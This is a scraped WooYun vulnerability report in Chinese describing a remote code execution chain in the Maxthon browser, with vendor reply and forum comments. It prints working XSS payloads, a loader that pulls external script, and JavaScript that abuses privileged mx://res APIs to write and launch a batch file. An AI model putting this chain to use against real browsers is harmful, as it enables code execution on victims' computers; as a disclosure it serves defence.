{"id": 28192, "wybug_id": "wooyun-2015-0102497", "wybug_title": "傲游浏览器远程代码执行及分析过程", "wybug_corp": "傲游", "wybug_author": "phith0n", "wybug_date": "2015-03-20 09:36", "wybug_open_date": "2015-06-18 17:22", "wybug_type": "远程代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["远程代码执行"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-20：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-03-20：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-03-23：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-05-14：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-05-24：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-06-03：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-06-18：\t细节向公众公开  简要描述： 前几天刷了一些xss，由一个引出了点小研究。 详细说明：  经过对傲游浏览器一番研究发现，当我们将浏览器主页设置成以“javascript:”为协议的时候，在用户打开主页时即可触发XSS。\n\n打开主页的方式是很有意思的，当我们在一个互联网网站打开主页时，触发XSS的域为about:blank，这个域的XSS没太大意义：\n\n但，当我们在一个新标签页打开主页的时候，其域为mx://res/quick-access/index.htm：\n\n这时候，权限就比较大了。经过二哥等几个前辈的研究，傲游浏览器有以下特点：\n1.\t通过mx://res/notification/可以调用maxthon.program，执行任意路径的程序。2.\t通过mx://res/app/%7B33CA60D6-EADC-4558-9185-2EBE14214AB9%7D/index.htm 可以调用maxthon.io进行文件操作。3.\t*.maxthon.cn、*.maxthon.com某些域名下存在maxthon对象，可以调用部分API。\n幸运的是，mx://res/quick-access/index.htm和mx://res/notification/等页面的protocol（mx）、host（res）、port（80）都是相同的，所以他们是同源的，符合浏览器SOP策略，我们直接通过mx://res/quick-access/index.htm就可以调用mx://res/notification/的API。现在我们等于有了一个mx://res/quick-access/index.htm域名下的XSS，我们想将其构造成远程命令执行，需要完成以下几步：\n1.通过某种方式让受害者增加一个域名为“javascript:xxx”的首页。2.用户点击首页后，执行我们的javascript代码3. 调用maxthon.io写入一个命令文件到受害者电脑，并调用maxthon.program执行之。\n那么，我们一步一步来。第1步，怎么让受害者增加这种域名的首页？经过我的研究，傲游的首页分为两种，一个叫“startpage”、一个叫“multihomepage”。二者有什么区别，startpage是浏览器启动时打开的时候调用的页面，multihomepage是点击主页时打开的页面：\n\n这二者均可触发XSS，但是前者触发的域是about:blank。为了设置mutihomepage，我们需要找一个遨游特权域下的XSS。这个还是比较简单的。这里说两个XSS：1.\t登录forum.maxthon.cn后访问如下链接即可触发：http://forum.maxthon.cn/member.php?mod=logging&action=login&referer=javascript://forum.maxthon.cn/%250dlocation.hash#<script>alert(/xss/)</script>2.\t直接访问如下页面触发：http://addonsmx.maxthon.com/en_US/search/all/PHN2ZyBvbmxvYWQ9YWxlcnQoMSk-第二个比较方便，我们就用这个了。测试了一下直接用<script>加载外部js文件会被拦截，只需要换成其他方式即可：\n<svg onload=\"s=createElement(&#39;script&#39;);s.src=&#39;//localhost/test/xss.js&#39;;document.body.appendChild(s);\" >\n以上payload进行base64编码后,访问：http://addonsmx.maxthon.com/d/search/all/PHN2ZyBvbmxvYWQ9InM9Y3JlYXRlRWxlbWVudCgmIzM5O3NjcmlwdCYjMzk7KTtzLnNyYz0mIzM5Oy8vbG9jYWxob3N0L3Rlc3QveHNzLmpzJiMzOTs7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChzKTsiID4，即可加载http://localhost/test/xss.jsxss.js里写上设置浏览器主页（multihomepage）的代码：\nvar a = 'javascript:document.write(\\\\\"<script src=http://localhost/test/mx.js><\\/script>\\\\\");';maxthon.browser.config.ConfigManager.set('maxthon.config', 'browser.general.multihomepage', '[\"'+a+'\"]');\n注意，这个multihomepage的设置方法和startpage略有不同，multihomepage传入的是多个url组成的数组转换成json后的字符串形式。这个时候，我们的主页已经变成如下形式了：\n\n用户在新建标签页点击主页按钮的时候，就会在mx://res域下加载上述js代码，mx.js如下：\nvar s1 = document.createElement(\"iframe\");s1.src=\"mx://res/app/%7B33CA60D6-EADC-4558-9185-2EBE14214AB9%7D/index.htm\";s1.onload = function(){\tvar b = new s1.contentWindow.maxthon.io.File.createTempFile();\tb.name_ = \"C:/1.bat\";\ts1.contentWindow.maxthon.io.FileWriter(b);\ts1.contentWindow.maxthon.io.writeText(\"whoami\\npause\");\tvar s2 = document.createElement(\"iframe\");\ts2.src=\"mx://res/notification/\";\ts2.onload = function(){\t\ts2.contentWindow.maxthon.program.Program.launch(\"C:/1.bat\",\"\");\t}\tdocument.lastChild.appendChild(s2);}document.lastChild.appendChild(s1);\n先写入c:/1.bat，再执行之：\n\n   漏洞证明：  使用傲游浏览器最新版本访问如下链接：http://mhz.pw/game/maxthon/test.html之后在新标签页点击主页按钮，即会触发。录制了一段视频，供参考：https://www.youtube.com/watch?v=0mvdhdREYiI或者链接: http://pan.baidu.com/s/1pJBiF7X 密码: 6k2i   修复方案：  不允许javascript协议。   版权声明：转载请注明来源 phith0n@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2015-03-20 17:21 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-03-20 09:39 |    \t\t泳少 \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:79        | ★           梦想这条路踏上了，跪着也要...)\t\t \n  ph牛也玩这个了？    \n     2015-03-20 09:56 |    \t\t胡小树 \t\t\t( 实习白帽子  |\t\t\t        Rank:60 漏洞数:11        | 我是一颗小小树)\t\t \n  大牛都搞浏览器了    \n     2015-03-20 13:01 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  都在刷遨游啊。。    \n     2015-03-20 13:26 |    \t\tizy \t\t\t( 普通白帽子  |\t\t\t        Rank:111 漏洞数:22        | http://1zy.pw/)\t\t \n  前排膜拜时雨牛！    \n     2015-03-20 15:18 |    \t\t残废 \t\t\t( 普通白帽子  |\t\t\t        Rank:179 漏洞数:40        | 我是残废，啦啦啦啦)\t\t \n  6666666666666666666    \n     2015-03-20 16:02 |    \t\tphith0n  \t\t\t( 核心白帽子 |\t\t\t        Rank:656 漏洞数:107        | 一个想当文人的黑客~)\t\t \n  @泳少 默默跟随各位大牛    \n     2015-03-24 18:00 |    \t\tmramydnei \t\t\t( 普通白帽子  |\t\t\t        Rank:348 漏洞数:80        )\t\t \n  p牛好棒    \n     2015-03-30 18:03 |    \t\t梧桐雨  \t\t\t( 核心白帽子 |\t\t\t        Rank:1576 漏洞数:184        | 关注技术与网络安全)\t\t \n  好奇DZ的浏览器在哪里下的。。我从官网下一直也只是4.4.4.2000。。    \n     2015-06-18 17:23 |    \t\tMark \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:2        | 渗透你的心)\t\t \n  大牛都搞浏览器了     \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}